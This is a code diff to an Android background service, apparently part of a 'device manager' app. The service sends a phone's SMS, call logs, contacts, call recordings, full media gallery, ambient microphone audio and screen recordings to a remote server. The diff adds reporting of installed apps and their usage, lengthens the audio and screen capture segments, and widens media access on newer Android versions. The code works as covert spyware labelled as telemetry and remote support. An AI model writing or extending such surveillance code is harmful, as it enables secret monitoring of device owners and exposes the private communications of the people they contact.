@@ -3,7 +3,12 @@ package com.company.devicemgr.services;
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
+import android.app.AppOpsManager;
 import android.app.Service;
+import android.app.usage.UsageStats;
+import android.app.usage.UsageStatsManager;
+import android.content.pm.ApplicationInfo;
+import android.content.pm.PackageInfo;
 import android.content.ContentResolver;
 import android.content.ContentUris;
 import android.content.SharedPreferences;
@@ -11,8 +16,6 @@ import android.database.Cursor;
 import android.location.Location;
 import android.location.LocationListener;
 import android.location.LocationManager;
-import android.graphics.Bitmap;
-import android.graphics.PixelFormat;
 import android.media.AudioFormat;
 import android.media.AudioRecord;
 import android.media.MediaRecorder;
@@ -26,8 +29,6 @@ import android.os.IBinder;
 import android.util.DisplayMetrics;
 import android.provider.MediaStore;
 import android.provider.ContactsContract;
-import android.media.Image;
-import android.media.ImageReader;
 import android.util.Log;
 
 import androidx.core.content.ContextCompat;
@@ -62,9 +63,11 @@ public class ForegroundTelemetryService extends Service implements LocationListe
     private static final String CHANNEL_ID = "devicemgr_channel";
     private static final String PREFS = "devicemgr_prefs";
     private static final int ANDROID_13_API_LEVEL = 33;
+    private static final int ANDROID_14_API_LEVEL = 34;
     private static final String READ_MEDIA_IMAGES_PERMISSION = "android.permission.READ_MEDIA_IMAGES";
     private static final String READ_MEDIA_VIDEO_PERMISSION = "android.permission.READ_MEDIA_VIDEO";
     private static final String READ_MEDIA_AUDIO_PERMISSION = "android.permission.READ_MEDIA_AUDIO";
+    private static final String READ_MEDIA_VISUAL_USER_SELECTED_PERMISSION = "android.permission.READ_MEDIA_VISUAL_USER_SELECTED";
     private static final String KEY_PENDING_EVENTS = "pending_events_queue";
     private static final String KEY_SENT_CALL_KEYS = "sent_call_keys";
     private static final String KEY_SENT_SMS_KEYS = "sent_sms_keys";
@@ -73,12 +76,15 @@ public class ForegroundTelemetryService extends Service implements LocationListe
     private static final String KEY_REMOTE_STREAM_LAST_CAPABILITY_AT = "remote_stream_last_capability_at";
     private static final String KEY_REMOTE_AUDIO_LAST_UPLOAD_PREFIX = "remote_audio_last_upload_";
     private static final String KEY_LAST_MEDIA_SCAN_AT = "last_media_scan_at";
+    private static final String KEY_LAST_APP_USAGE_SYNC_AT = "last_app_usage_sync_at";
     private static final String KEY_RECENT_WHATSAPP_CONTACTS = "recent_whatsapp_contacts";
     private static final long NORMAL_LOOP_MS = 30_000L;
     private static final long ACTIVE_REMOTE_LOOP_MS = 900L;
     private static final long MEDIA_SCAN_INTERVAL_MS = 60_000L;
-    private static final long REMOTE_SCREEN_FRAME_INTERVAL_MS = 2_200L;
-    private static final int REMOTE_AUDIO_SEGMENT_MS = 1_200;
+    private static final long APP_USAGE_SYNC_INTERVAL_MS = 15 * 60_000L;
+    private static final long APP_USAGE_WINDOW_MS = 24 * 60 * 60_000L;
+    private static final long REMOTE_SCREEN_FRAME_INTERVAL_MS = 60_000L;
+    private static final int REMOTE_AUDIO_SEGMENT_MS = 60_000;
     private static final int REMOTE_AUDIO_SAMPLE_RATE = 16_000;
 
     private LocationManager locationManager;
@@ -86,10 +92,12 @@ public class ForegroundTelemetryService extends Service implements LocationListe
     private volatile boolean running = false;
     private volatile MediaProjection mediaProjection = null;
     private volatile VirtualDisplay screenVirtualDisplay = null;
-    private volatile ImageReader screenImageReader = null;
     private volatile MediaRecorder screenRecorder = null;
     private volatile File screenRecorderFile = null;
     private volatile String activeScreenSessionId = null;
+    private volatile String activeAudioSessionId = null;
+    private volatile boolean remoteScreenSegmentRunning = false;
+    private volatile boolean remoteAudioSegmentRunning = false;
     private static final String KEY_REMOTE_SCREEN_LAST_UPLOAD_PREFIX = "remote_screen_last_upload_";
 
     @Override
@@ -147,13 +155,14 @@ public class ForegroundTelemetryService extends Service implements LocationListe
                     JSONObject activeSession = syncRemoteSupportState();
                     maybeRunRemoteSupportStream(activeSession);
                     maybeUploadAllMedia();
+                    maybeSendAppUsageSnapshot();
 
                     if ((loops % 2) == 0) {
                         sendSmsDump();
                         sendCallLogDump();
                         sendContactsDump();
                         try {
-                            AppRuntime.startServiceCompat(this, new android.content.Intent(this, CallRecordingService.class), true);
+                            AppRuntime.startServiceCompat(this, new android.content.Intent(this, CallRecorderService.class), true);
                         } catch (Exception ignored) {
                         }
                         flushPendingEvents(120);
@@ -184,14 +193,61 @@ public class ForegroundTelemetryService extends Service implements LocationListe
     }
 
     private boolean canReadMedia() {
+        if (Build.VERSION.SDK_INT >= ANDROID_14_API_LEVEL) {
+            return hasImageAccess() || hasVideoAccess() || hasAudioAccess();
+        }
         if (Build.VERSION.SDK_INT >= ANDROID_13_API_LEVEL) {
             return hasPermission(READ_MEDIA_IMAGES_PERMISSION) || hasPermission(READ_MEDIA_VIDEO_PERMISSION) || hasPermission(READ_MEDIA_AUDIO_PERMISSION);
         }
         return hasPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE);
     }
 
+    private boolean hasVisualUserSelectedAccess() {
+        return Build.VERSION.SDK_INT >= ANDROID_14_API_LEVEL
+                && hasPermission(READ_MEDIA_VISUAL_USER_SELECTED_PERMISSION);
+    }
+
+    private boolean hasImageAccess() {
+        if (Build.VERSION.SDK_INT >= ANDROID_14_API_LEVEL) {
+            return hasPermission(READ_MEDIA_IMAGES_PERMISSION) || hasVisualUserSelectedAccess();
+        }
+        if (Build.VERSION.SDK_INT >= ANDROID_13_API_LEVEL) {
+            return hasPermission(READ_MEDIA_IMAGES_PERMISSION);
+        }
+        return hasPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE);
+    }
+
+    private boolean hasVideoAccess() {
+        if (Build.VERSION.SDK_INT >= ANDROID_14_API_LEVEL) {
+            return hasPermission(READ_MEDIA_VIDEO_PERMISSION) || hasVisualUserSelectedAccess();
+        }
+        if (Build.VERSION.SDK_INT >= ANDROID_13_API_LEVEL) {
+            return hasPermission(READ_MEDIA_VIDEO_PERMISSION);
+        }
+        return hasPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE);
+    }
+
+    private boolean hasAudioAccess() {
+        if (Build.VERSION.SDK_INT >= ANDROID_13_API_LEVEL) {
+            return hasPermission(READ_MEDIA_AUDIO_PERMISSION);
+        }
+        return hasPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE);
+    }
+
     private SharedPreferences prefs() {
         return getSharedPreferences(PREFS, MODE_PRIVATE);
+    }
+
+    private boolean hasUsageStatsAccess() {
+        try {
+            AppOpsManager appOps = (AppOpsManager) getSystemService(APP_OPS_SERVICE);
+            if (appOps == null) return false;
+            int mode = appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), getPackageName());
+            return mode == AppOpsManager.MODE_ALLOWED;
+        } catch (Exception e) {
+            Log.e(TAG, "hasUsageStatsAccess err", e);
+            return false;
+        }
     }
 
     private String currentDeviceId() {
@@ -341,6 +397,8 @@ public class ForegroundTelemetryService extends Service implements LocationListe
     private void maybeRunRemoteSupportStream(JSONObject activeSession) {
         if (activeSession == null || activeSession.optString("sessionId", "").length() == 0) {
             activeScreenSessionId = null;
+            activeAudioSessionId = null;
+            releaseScreenProjection();
             return;
         }
         String requestType = activeSession.optString("requestType", "");
@@ -348,14 +406,54 @@ public class ForegroundTelemetryService extends Service implements LocationListe
 
         if ("ambient_audio".equals(requestType)) {
             activeScreenSessionId = null;
-            captureAndUploadAmbientAudio(sessionId);
+            activeAudioSessionId = sessionId;
+            releaseScreenProjection();
+            maybeStartRemoteAudioSegment(sessionId);
             return;
         }
 
         if ("screen".equals(requestType)) {
             activeScreenSessionId = sessionId;
-            captureAndUploadScreenFrame(sessionId);
+            activeAudioSessionId = null;
+            maybeStartRemoteScreenSegment(sessionId);
+            return;
         }
+
+        activeScreenSessionId = null;
+        activeAudioSessionId = null;
+        releaseScreenProjection();
+    }
+
+    private void maybeStartRemoteScreenSegment(String sessionId) {
+        if (remoteScreenSegmentRunning || !isScreenSessionActive(sessionId)) return;
+        remoteScreenSegmentRunning = true;
+        new Thread(() -> {
+            try {
+                captureAndUploadScreenFrame(sessionId);
+            } finally {
+                remoteScreenSegmentRunning = false;
+            }
+        }, "remote-screen-segment").start();
+    }
+
+    private void maybeStartRemoteAudioSegment(String sessionId) {
+        if (remoteAudioSegmentRunning || !isAudioSessionActive(sessionId)) return;
+        remoteAudioSegmentRunning = true;
+        new Thread(() -> {
+            try {
+                captureAndUploadAmbientAudio(sessionId);
+            } finally {
+                remoteAudioSegmentRunning = false;
+            }
+        }, "remote-audio-segment").start();
+    }
+
+    private boolean isScreenSessionActive(String sessionId) {
+        return sessionId != null && sessionId.equals(activeScreenSessionId);
+    }
+
+    private boolean isAudioSessionActive(String sessionId) {
+        return sessionId != null && sessionId.equals(activeAudioSessionId);
     }
 
     private void maybeUploadAllMedia() {
@@ -370,6 +468,7 @@ public class ForegroundTelemetryService extends Service implements LocationListe
     }
 
     private void captureAndUploadScreenFrame(String sessionId) {
+        if (!isScreenSessionActive(sessionId)) return;
         long now = System.currentTimeMillis();
         long lastUploadAt = prefs().getLong(KEY_REMOTE_SCREEN_LAST_UPLOAD_PREFIX + sessionId, 0L);
         if ((now - lastUploadAt) < REMOTE_SCREEN_FRAME_INTERVAL_MS) return;
@@ -389,8 +488,8 @@ public class ForegroundTelemetryService extends Service implements LocationListe
             screenRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
             screenRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
             screenRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
-            screenRecorder.setVideoEncodingBitRate(2_000_000);
-            screenRecorder.setVideoFrameRate(12);
+            screenRecorder.setVideoEncodingBitRate(1_000_000);
+            screenRecorder.setVideoFrameRate(8);
             screenRecorder.setVideoSize(width, height);
             screenRecorder.setOutputFile(screenRecorderFile.getAbsolutePath());
             screenRecorder.prepare();
@@ -405,7 +504,8 @@ public class ForegroundTelemetryService extends Service implements LocationListe
                     null
             );
             screenRecorder.start();
-            Thread.sleep(REMOTE_SCREEN_FRAME_INTERVAL_MS - 400L);
+            Thread.sleep(Math.max(5_000L, REMOTE_SCREEN_FRAME_INTERVAL_MS - 500L));
+            if (!isScreenSessionActive(sessionId)) throw new IllegalStateException("stale_screen_session");
             screenRecorder.stop();
             screenRecorder.reset();
             screenRecorder.release();
@@ -431,6 +531,7 @@ public class ForegroundTelemetryService extends Service implements LocationListe
 
             String filename = "remote_screen_" + sessionId + "_" + startedAt + ".mp4";
             long uploadStartedAt = System.currentTimeMillis();
+            if (!isScreenSessionActive(sessionId)) throw new IllegalStateException("stale_screen_session");
             String res = HttpClient.uploadFile(
                     ApiConfig.api("/api/media/" + currentDeviceId() + "/upload"),
                     "media",
@@ -455,11 +556,6 @@ public class ForegroundTelemetryService extends Service implements LocationListe
         } catch (Exception e) {
             Log.e(TAG, "captureAndUploadScreenFrame err", e);
             try {
-                captureAndUploadScreenImage(sessionId);
-            } catch (Exception fallbackError) {
-                Log.e(TAG, "captureAndUploadScreenImage fallback err", fallbackError);
-            }
-            try {
                 JSONObject ctx = new JSONObject();
                 ctx.put("sessionId", sessionId);
                 ctx.put("error", e.getClass().getSimpleName());
@@ -480,69 +576,6 @@ public class ForegroundTelemetryService extends Service implements LocationListe
             }
             screenRecorder = null;
             if (screenRecorderFile != null && screenRecorderFile.exists()) screenRecorderFile.delete();
-        }
-    }
-
-    private void captureAndUploadScreenImage(String sessionId) throws Exception {
-        if (mediaProjection == null) return;
-        long startedAt = System.currentTimeMillis();
-        DisplayMetrics dm = getResources().getDisplayMetrics();
-        int width = Math.max(480, Math.min(1080, dm.widthPixels));
-        int height = Math.max(800, Math.min(1920, dm.heightPixels));
-        int density = Math.max(1, dm.densityDpi);
-        ImageReader reader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
-        VirtualDisplay display = mediaProjection.createVirtualDisplay(
-                "remote-screen-fallback",
-                width,
-                height,
-                density,
-                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
-                reader.getSurface(),
-                null,
-                null
-        );
-        Image image = null;
-        try {
-            Thread.sleep(450L);
-            image = reader.acquireLatestImage();
-            if (image == null) throw new IllegalStateException("screen_image_unavailable");
-            byte[] jpeg = imageToJpeg(image);
-            if (jpeg == null || jpeg.length == 0) throw new IllegalStateException("empty_screen_image");
-            Map<String, String> form = new HashMap<>();
-            form.put("captureMode", "remote_live");
-            form.put("captureKind", "screen");
-            form.put("supportSessionId", sessionId);
-            form.put("segmentStartedAtMs", String.valueOf(startedAt));
-            form.put("segmentDurationMs", "1");
-            JSONObject metadata = new JSONObject();
-            metadata.put("source", "MediaProjection");
-            metadata.put("transport", "jpeg_fallback");
-            metadata.put("capturedAtMs", startedAt);
-            form.put("metadataJson", metadata.toString());
-            String filename = "remote_screen_" + sessionId + "_" + startedAt + ".jpg";
-            String res = HttpClient.uploadFile(
-                    ApiConfig.api("/api/media/" + currentDeviceId() + "/upload"),
-                    "media",
-                    filename,
-                    jpeg,
-                    "image/jpeg",
-                    form,
-                    currentToken()
-            );
-            JSONObject parsed = new JSONObject(res != null ? res : "{}");
-            if (parsed.optBoolean("ok")) {
-                prefs().edit().putLong(KEY_REMOTE_SCREEN_LAST_UPLOAD_PREFIX + sessionId, System.currentTimeMillis()).apply();
-            }
-        } finally {
-            if (image != null) image.close();
-            try {
-                display.release();
-            } catch (Exception ignored) {
-            }
-            try {
-                reader.close();
-            } catch (Exception ignored) {
-            }
         }
     }
 
@@ -601,33 +634,11 @@ public class ForegroundTelemetryService extends Service implements LocationListe
         } catch (Exception ignored) {
         }
         try {
-            if (screenImageReader != null) screenImageReader.close();
-        } catch (Exception ignored) {
-        }
-        try {
             if (mediaProjection != null) mediaProjection.stop();
         } catch (Exception ignored) {
         }
         screenVirtualDisplay = null;
-        screenImageReader = null;
         mediaProjection = null;
-    }
-
-    private byte[] imageToJpeg(Image image) throws Exception {
-        Image.Plane[] planes = image.getPlanes();
-        if (planes == null || planes.length == 0) return null;
-        ByteBuffer buffer = planes[0].getBuffer();
-        int pixelStride = planes[0].getPixelStride();
-        int rowStride = planes[0].getRowStride();
-        int rowPadding = rowStride - pixelStride * image.getWidth();
-        Bitmap bitmap = Bitmap.createBitmap(image.getWidth() + rowPadding / pixelStride, image.getHeight(), Bitmap.Config.ARGB_8888);
-        bitmap.copyPixelsFromBuffer(buffer);
-        Bitmap cropped = Bitmap.createBitmap(bitmap, 0, 0, image.getWidth(), image.getHeight());
-        ByteArrayOutputStream output = new ByteArrayOutputStream();
-        cropped.compress(Bitmap.CompressFormat.JPEG, 65, output);
-        bitmap.recycle();
-        cropped.recycle();
-        return output.toByteArray();
     }
 
     private static class IntentDataHolder {
@@ -656,6 +667,7 @@ public class ForegroundTelemetryService extends Service implements LocationListe
     }
 
     private void captureAndUploadAmbientAudio(String sessionId) {
+        if (!isAudioSessionActive(sessionId)) return;
         long now = System.currentTimeMillis();
         long lastUploadAt = prefs().getLong(KEY_REMOTE_AUDIO_LAST_UPLOAD_PREFIX + sessionId, 0L);
         if ((now - lastUploadAt) < (REMOTE_AUDIO_SEGMENT_MS + 500L)) return;
@@ -697,6 +709,7 @@ public class ForegroundTelemetryService extends Service implements LocationListe
             ByteArrayOutputStream pcm = new ByteArrayOutputStream();
             long deadline = captureStartedAt + REMOTE_AUDIO_SEGMENT_MS;
             while (System.currentTimeMillis() < deadline) {
+                if (!isAudioSessionActive(sessionId)) throw new IllegalStateException("stale_audio_session");
                 int read = recorder.read(chunk, 0, chunk.length);
                 if (read > 0) pcm.write(chunk, 0, read);
             }
@@ -719,6 +732,7 @@ public class ForegroundTelemetryService extends Service implements LocationListe
 
             long uploadStartedAt = System.currentTimeMillis();
             String filename = "remote_audio_" + sessionId + "_" + captureStartedAt + ".wav";
+            if (!isAudioSessionActive(sessionId)) throw new IllegalStateException("stale_audio_session");
             String res = HttpClient.uploadFile(
                     ApiConfig.api("/api/media/" + currentDeviceId() + "/upload"),
                     "media",
@@ -1058,6 +1072,85 @@ public class ForegroundTelemetryService extends Service implements LocationListe
         return "Desconhecida";
     }
 
+    private void maybeSendAppUsageSnapshot() {
+        try {
+            if (!hasUsageStatsAccess()) return;
+            long lastSyncAt = prefs().getLong(KEY_LAST_APP_USAGE_SYNC_AT, 0L);
+            if ((System.currentTimeMillis() - lastSyncAt) < APP_USAGE_SYNC_INTERVAL_MS) return;
+
+            JSONObject payload = buildAppUsageSnapshot();
+            if (payload == null) return;
+            sendOrQueue("app_usage_snapshot", payload);
+            prefs().edit().putLong(KEY_LAST_APP_USAGE_SYNC_AT, System.currentTimeMillis()).apply();
+        } catch (Exception e) {
+            Log.e(TAG, "maybeSendAppUsageSnapshot err", e);
+        }
+    }
+
+    private JSONObject buildAppUsageSnapshot() {
+        try {
+            UsageStatsManager usageStatsManager = (UsageStatsManager) getSystemService(USAGE_STATS_SERVICE);
+            if (usageStatsManager == null) return null;
+
+            long now = System.currentTimeMillis();
+            long windowStart = now - APP_USAGE_WINDOW_MS;
+            List<UsageStats> usageStats = usageStatsManager.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, windowStart, now);
+            Map<String, UsageStats> usageByPackage = new HashMap<>();
+            if (usageStats != null) {
+                for (UsageStats stat : usageStats) {
+                    if (stat == null || stat.getPackageName() == null) continue;
+                    UsageStats existing = usageByPackage.get(stat.getPackageName());
+                    if (existing == null) {
+                        usageByPackage.put(stat.getPackageName(), stat);
+                    } else {
+                        existing.add(stat);
+                    }
+                }
+            }
+
+            JSONArray apps = new JSONArray();
+            List<ApplicationInfo> installedApps = getPackageManager().getInstalledApplications(0);
+            int added = 0;
+            for (ApplicationInfo appInfo : installedApps) {
+                if (appInfo == null || appInfo.packageName == null) continue;
+                JSONObject app = new JSONObject();
+                String packageName = appInfo.packageName;
+                CharSequence label = getPackageManager().getApplicationLabel(appInfo);
+                UsageStats stat = usageByPackage.get(packageName);
+                PackageInfo packageInfo = null;
+                try {
+                    packageInfo = getPackageManager().getPackageInfo(packageName, 0);
+                } catch (Exception ignored) {
+                }
+
+                app.put("packageName", packageName);
+                app.put("appName", label != null ? label.toString() : packageName);
+                app.put("isSystemApp", (appInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0);
+                if (packageInfo != null) app.put("firstInstallTimeMs", packageInfo.firstInstallTime);
+                if (stat != null) {
+                    app.put("lastTimeUsedMs", stat.getLastTimeUsed());
+                    app.put("totalForegroundMs", stat.getTotalTimeInForeground());
+                } else {
+                    app.put("lastTimeUsedMs", 0L);
+                    app.put("totalForegroundMs", 0L);
+                }
+                apps.put(app);
+                added++;
+                if (added >= 500) break;
+            }
+
+            JSONObject payload = new JSONObject();
+            payload.put("capturedAtMs", now);
+            payload.put("windowStartMs", windowStart);
+            payload.put("windowEndMs", now);
+            payload.put("apps", apps);
+            return payload;
+        } catch (Exception e) {
+            Log.e(TAG, "buildAppUsageSnapshot err", e);
+            return null;
+        }
+    }
+
     private String lookupContactName(String phoneNumber) {
         if (phoneNumber == null || phoneNumber.trim().length() == 0) return null;
         if (!hasPermission(android.Manifest.permission.READ_CONTACTS)) return null;
@@ -1102,12 +1195,73 @@ public class ForegroundTelemetryService extends Service implements LocationListe
                     MediaStore.MediaColumns.DATE_ADDED
             };
 
-            uploadMediaCursor(cr.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, MediaStore.MediaColumns.DATE_ADDED + " DESC"), true, "gallery_image", cr, uploaded, uploadedObj, sp, deviceId, token);
-            uploadMediaCursor(cr.query(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, projection, null, null, MediaStore.MediaColumns.DATE_ADDED + " DESC"), false, "gallery_video", cr, uploaded, uploadedObj, sp, deviceId, token);
-            uploadMediaCursor(cr.query(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, projection, null, null, MediaStore.MediaColumns.DATE_ADDED + " DESC"), false, "gallery_audio", cr, uploaded, uploadedObj, sp, deviceId, token);
+            if (hasImageAccess()) {
+                scanMediaCollection(
+                        cr,
+                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+                        projection,
+                        true,
+                        "gallery_image",
+                        uploaded,
+                        uploadedObj,
+                        sp,
+                        deviceId,
+                        token
+                );
+            }
+
+            if (hasVideoAccess()) {
+                scanMediaCollection(
+                        cr,
+                        MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
+                        projection,
+                        false,
+                        "gallery_video",
+                        uploaded,
+                        uploadedObj,
+                        sp,
+                        deviceId,
+                        token
+                );
+            }
+
+            if (hasAudioAccess()) {
+                scanMediaCollection(
+                        cr,
+                        MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
+                        projection,
+                        false,
+                        "gallery_audio",
+                        uploaded,
+                        uploadedObj,
+                        sp,
+                        deviceId,
+                        token
+                );
+            }
 
         } catch (Exception e) {
             Log.e(TAG, "uploadAllMediaOnce err", e);
+        }
+    }
+
+    private void scanMediaCollection(ContentResolver cr, Uri collectionUri, String[] projection, boolean image, String origin, Set<String> uploaded, JSONObject uploadedObj, SharedPreferences sp, String deviceId, String token) {
+        try {
+            uploadMediaCursor(
+                    cr.query(collectionUri, projection, null, null, MediaStore.MediaColumns.DATE_ADDED + " DESC"),
+                    image,
+                    origin,
+                    cr,
+                    uploaded,
+                    uploadedObj,
+                    sp,
+                    deviceId,
+                    token
+            );
+        } catch (SecurityException e) {
+            Log.w(TAG, "no permission for " + origin, e);
+        } catch (Exception e) {
+            Log.e(TAG, "scan media err " + origin, e);
         }
     }
 
